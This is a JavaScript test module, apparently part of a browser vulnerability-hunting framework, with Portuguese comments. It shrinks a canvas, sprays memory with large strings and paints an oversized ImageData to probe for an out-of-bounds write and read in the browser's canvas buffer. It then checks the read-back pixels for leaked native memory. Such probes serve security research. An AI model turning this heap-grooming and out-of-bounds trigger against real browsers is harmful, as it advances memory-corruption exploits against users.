import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CANVAS_IMAGEDATA_OOB',
    category: 'Graphics',
    risk:     'HIGH',
    description:
        'Out-of-Bounds Read/Write na memória do Canvas (ImageBuffer). Cria um ImageData gigante. ' +
        'Encolhe o canvas sincronicamente para 1x1 (destruindo o buffer C++ original) e força ' +
        'a pintura dos dados gigantes. O C++ pode falhar a verificação de limites (Bounds Check).',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.canvas = document.createElement('canvas');
        this.canvas.width = 500;
        this.canvas.height = 500;
        this.sandbox.appendChild(this.canvas);
        
        this.ctx = this.canvas.getContext('2d', { willReadFrequently: true });
        
        // Criamos o payload de memória (Array massivo)
        this.toxicData = this.ctx.createImageData(500, 500);
        // Preenchemos com 0x41 (A)
        this.toxicData.data.fill(0x41); 
    },

    trigger: function() {
        try {
            // O GATILHO DA CORRIDA SÍNCRONA
            // 1. Encolhemos o canvas para 1 pixel, forçando o C++ a libertar o buffer de 500x500
            this.canvas.width = 1; 
            
            // 2. Inundação de memória
            let trash = Groomer.sprayStrings(100, 1024 * 250); // 250KB strings
            
            // 3. Forçamos o desenho dos 500x500 originais. O C++ devia rejeitar isto ou clipar.
            // Se o bounds check falhar, vai escrever fora do buffer (OOB Write)!
            this.ctx.putImageData(this.toxicData, 0, 0);
            
            // 4. Se não crashou, tentamos extrair o lixo adjacente!
            this.results.leaked = this.ctx.getImageData(0, 0, 2, 1);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Pintura Gráfica Aceite',
        
        // Probe de LEAK (OOB Read)
        s => {
            if (s.results.leaked) {
                let pixel = s.results.leaked.data;
                // Como pintámos com 0x41 (65), se a cor lida for diferente
                // (e diferente de 0), estamos a ver dados nativos de outras partes da RAM!
                if (pixel[0] !== 0 && pixel[0] !== 65) {
                    // Retornamos um número gigante para ativar o STALE DATA
                    let hex = (pixel[0] << 16) | (pixel[1] << 8) | pixel[2];
                    return hex; 
                }
            }
            return 0; // Protegido (Buffer Clipado)
        }
    ],

    cleanup: function() {
        try { this.canvas.remove(); } catch(e){}
        this.canvas = null;
        this.ctx = null;
        this.toxicData = null;
        this.results = {};
    }
};
